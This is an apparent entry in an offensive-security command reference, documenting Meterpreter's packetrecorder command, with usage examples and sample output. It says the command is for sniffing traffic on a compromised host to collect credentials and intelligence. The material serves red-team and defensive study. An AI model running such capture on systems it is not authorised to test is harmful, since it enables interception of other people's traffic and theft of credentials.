---
id: dff94206-9212-47d8-b3d4-34dbd8e9048f
name: meterpreter-packetrecorder-record-packets
type: command
executor: meterpreter
data: run packetrecorder -i $_INTERFACE_ID -o $_OUTPUT_FILE
output: null
created_at: '2023-04-06T03:56:21.428227+00:00'
updated_at: '2023-04-10T20:24:58.780502+00:00'
platforms:
  - Linux
  - Windows
tags:
  - metasploit
  - meterpreter
  - network-sniffing
verified: true
validated: true
---

# meterpreter-packetrecorder-record-packets

## Command

```meterpreter
run packetrecorder -i $_INTERFACE_ID -o $_OUTPUT_FILE
```

## Description

This command starts capturing network packets on a specified interface in a Meterpreter session, saving them to a PCAP file. It's essential for sniffing traffic to gather intelligence or credentials post-compromise.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-i $_INTERFACE_ID` | Interface ID to capture from (e.g., 1 for eth0) | Yes |
| `-o $_OUTPUT_FILE` | Output PCAP filename (e.g., traffic.pcap); defaults to timestamped if omitted | No |

## Examples

### Basic Usage

```meterpreter
run packetrecorder -i 1
```

### Advanced Usage

```meterpreter
run packetrecorder -i 1 -o sensitive_traffic.pcap
```

## Expected Output

[*] Recording packets on interface 1...
[*] Packets captured: 1500 (ongoing; press Ctrl+C to stop)
[*] Capture saved to /loot/packetrecorder_...

The command runs until interrupted, logging progress and final save location.

## Related

- [[procedures/Capture-Network-Packets-with-Meterpreter]]
- [[commands/meterpreter-packetrecorder-list-interfaces]]
